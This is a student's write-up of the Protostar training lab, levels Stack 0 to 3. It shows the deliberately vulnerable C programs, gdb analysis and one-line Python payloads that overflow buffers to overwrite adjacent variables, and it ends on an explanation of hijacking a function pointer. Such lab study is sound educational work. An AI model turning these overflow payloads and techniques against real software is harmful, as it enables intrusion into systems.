# Protostar Exploits Writeups.

[Link](https://exploit.education/protostar/)


After setting up the Protostate we can connect to it using the ssh on our localhost and can go into the /bin/sh shell.
![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/7c4443a6-6d96-4910-ad98-ae14744bd6ec)

> Username: user
> 
> Password: user


## Stack 0

This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

So in this program we have to basically modify the value to the variable "modified" and run the code so that the part to code that is not desirable to run can be run.

we know that the gets function is a buggy function we can also check into the man page.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/b09a466e-8aeb-401a-b8cc-ce6f72bb32b0)

using the gets function we can overwrite the stack as we cannot control the input size of the gets function it continues to take the input.

lets check into the disassebly code and check for the stack.
opening the program in GDB and disassemblying the main function.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/132f6a48-4850-4114-adbe-100440e9c3a3)

setting the break pointer and runneing the code with sample input and cheking for the registers value we can clearly see that the buffer value starts from the 0xbffff76b to 0xbffff7ab and the next 4 bytes that are for the modified variable are kept to 0 also we can see that it follows little endian format.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/945028f6-d348-4d4a-a609-2341ea2ee30d)

so basically we have to write a byte array that is larger than ```0xbffff7ab - 0xbffff76b = 64``` to over flow into the next variable.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/60904dff-8466-4db6-9ba9-fcc8964a9c4d)

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/11d9aa2d-08a1-49ab-b08f-6aa1d4fcb855)

and are we are done.

we can also use the following script to do so.


```sh
python -c "print('A'*65)" | ./stack0
```

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/f25cbdd7-cbc2-4e9b-b7b8-7fe698380bbe)



## Stack 1

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/ab8c5ba8-f209-480a-a268-7453baaf19c5)

Source Code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

This program is bit similar to previous one but this time we have to change to value to modified variable to something particualar given to us. ```0x61626364``` also the busffer variable is set with teh strcpy function which functions as similar in buffer overflow.
applying the previous trick to get the buffer over flow in modified variable. the size of buffer is of 64 bytes and next 4 bytes for the buffer overflow into modified variable.


opening it in gdb and imputing the overflow array.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/6df0d495-d1ac-47d3-98f5-6f71e01e417e)

here we successfully changed the value of the modified variable to the required value.

we can also use following code snippit to do it

```sh
./stack1 $(python -c "print('A'*64+'\x64\x63\x62\x61')")
```

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/1546931c-e777-4035-8358-ea48970ff069)



## Stack 2

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/a2a8cd1f-ce27-40be-89c9-f39aadf0045b)

Source Code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
in this we have to define a path variable to take the input from and thus resulting into the overflow of the buffer variable.
this is similar to the previous stack challenge just we have to inject using the environment variable.

we can use the following script to do so.

```sh
GREENIE=$(python -c "print 'A' * 64 + '\x0a\x0d\x0a\x0d'") ./stack2
```

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/dde77294-1d9e-4996-9f27-6e42bf3791a7)


## Stack 3

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/3c58b8bc-eec7-4f0f-8701-2978eb1c3ede)

Source Code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

Now by using the same concept of buffer overflow we have to call the function win that is just defined in our code but is not called.
to do so we have to overlook for the stack and how is the function is called using the stacks.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/1c5e3932-bce8-44b1-bddf-7bdefb0deb95)

So basically when a fucntion is called the return address is placed into the stack so that it knows from where to start when the function returns. so what if we change the value of the return address to something that we wanted. i.e. the address of the win function so when the function retunr it gets to the function call.










